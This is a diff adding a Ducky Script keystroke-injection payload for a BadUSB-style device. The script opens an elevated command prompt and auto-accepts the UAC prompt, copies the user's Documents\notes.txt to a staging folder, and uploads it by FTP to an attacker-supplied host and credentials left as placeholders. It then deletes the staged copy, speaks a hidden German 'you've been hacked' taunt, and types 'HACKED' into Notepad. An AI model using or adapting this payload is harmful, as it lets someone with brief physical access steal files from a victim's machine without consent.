@@ -1,0 +1,82 @@
+REM Minimize all windows
+GUI d
+DELAY 1000
+REM Open cmd
+GUI r
+DELAY 1000
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 1000
+ALT j
+ENTER
+DELAY 1000
+STRING cd "C:\users"
+ENTER
+STRING MD test
+ENTER
+STRING copy "C:\users\%USERNAME%\Documents\notes.txt" "C:\users\test"
+ENTER
+STRING exit
+ENTER
+
+
+REM Upload file using FTP
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 200
+STRING ftp
+ENTER
+STRING o
+ENTER
+STRING <your ftp Ip><port>
+ENTER
+DELAY 5000
+STRING <your user>
+ENTER
+STRING <your password>
+ENTER
+DELAY 1000
+STRING mput "C:\users\test\*"
+ENTER
+REPEAT 1000
+DELAY 5000
+STRING quit
+ENTER
+STRING exit
+ENTER
+
+REM Delete Log.txt and exit
+GUI r
+DELAY 1000
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 1000
+ALT j
+ENTER
+DELAY 1000
+STRING del "C:\users\test"
+ENTER
+STRING j
+ENTER
+STRING exit
+ENTER
+
+REM Sprachausgabe über Powershell!
+DELAY 2000
+WINDOWS r
+DELAY 500
+STRING Powershell -windowstyle hidden -Command "Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('Erwischt, Sie wurden gehaaaaaackt! ha ha ha ha ha! Liebe Grueße dein Security Team');" exit;
+ENTER
+DELAY 500
+WINDOWS r
+DELAY 500
+STRING notepad.exe
+ENTER
+DELAY 500
+STRING #####################
+ENTER
+STRING HACKED;HACKED;HACKED#
+ENTER
+STRING #####################
